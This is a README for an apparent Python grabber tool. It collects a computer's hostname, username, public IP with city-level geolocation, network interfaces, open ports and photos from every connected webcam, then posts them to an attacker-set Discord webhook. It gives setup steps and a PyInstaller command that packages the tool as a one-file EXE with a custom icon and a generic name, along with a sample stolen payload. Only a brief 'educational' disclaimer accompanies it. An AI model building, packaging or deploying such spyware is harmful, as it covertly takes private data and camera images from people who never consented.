Open source Python project made for educational and demonstration purposes.
➜ Sends system information to a Discord webhook.

---

## Features

- System information collection
- CPU usage
- RAM usage
- Hostname
- Operating system
- Local IP address
- Webcam capture 
- Discord webhook integration

---

## Configuration

➜ Change the webhook variable at the beginning of the code:

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/..."
```
Anyone with access to the executable or source code may recover the webhook URL.

---

## Installation

```bash
pip install -r requirements.txt
```

---

## Usage

```bash
python main.py
```

---

## Build EXE

```bash
pyinstaller --onefile --icon=Icon.ico --name Program_Name main.py
```

➜ The executable will be generated inside:

```text
dist/
```

---

## Project Structure

```text
project/
│
├── main.py
├── requirements.txt
├── install_requirements.py
├── Icon.ico
├── README.md
└── LICENSE
```

---

## Example Payload

```json
{
  "pc": {
    "hostname": "m*****",
    "username": "t***",
    "local_ip": "192.168.*.***",
    "os": "Windows",
    "release": "11",
    "version": "10.0.*****",
    "arch": "AMD64",
    "cpu": "AMD64 Family ** Model ** Stepping *, ************",
    "cores": 24,
    "threads": 24,
    "ram_gb": 31.94,
    "boot_time": "**********",
    "users": [
      "t***"
    ]
  },

  "ip": {
    "ip": "**.***.**.***",
    "hostname": "***.***.***.***.rev.***.net",
    "city": "Paris",
    "region": "Île-de-France",
    "country": "FR",
    "loc": "**.****,*.****",
    "org": "AS***** ***********************",
    "postal": "75***",
    "timezone": "Europe/Paris",
    "readme": "https://ipinfo.io/missingauth"
  },

  "network": {
    "Ethernet": [
      {
        "ip": "**-**-**-**-**-**",
        "netmask": null,
        "broadcast": null
      },
      {
        "ip": "192.168.*.***",
        "netmask": "255.255.255.0",
        "broadcast": null
      },
      {
        "ip": "****:****:****:****:****:****:****:****",
        "netmask": null,
        "broadcast": null
      }
    ],

    "Wi-Fi": [
      {
        "ip": "**-**-**-**-**-**",
        "netmask": null,
        "broadcast": null
      },
      {
        "ip": "169.254.***.***",
        "netmask": "255.255.0.0",
        "broadcast": null
      }
    ],

    "Bluetooth Network Connection": [
      {
        "ip": "**-**-**-**-**-**",
        "netmask": null,
        "broadcast": null
      }
    ],

    "Loopback Pseudo-Interface 1": [
      {
        "ip": "127.0.0.1",
        "netmask": "255.0.0.0",
        "broadcast": null
      },
      {
        "ip": "::1",
        "netmask": null,
        "broadcast": null
      }
    ]
  },

  "ports": [
    {
      "ip": "0.0.0.0",
      "port": "*****",
      "status": "NONE"
    },
    {
      "ip": "192.168.*.***",
      "port": "*****",
      "status": "ESTABLISHED"
    }
  ]
}
```
(+ a photo of all the cameras connected to the computer)
---

## License

➜ MIT License

Free to use, modify and distribute.

---

## Disclaimer

This project is intended for educational, testing and demonstration purposes only.

➜ Do not use on systems without permission.
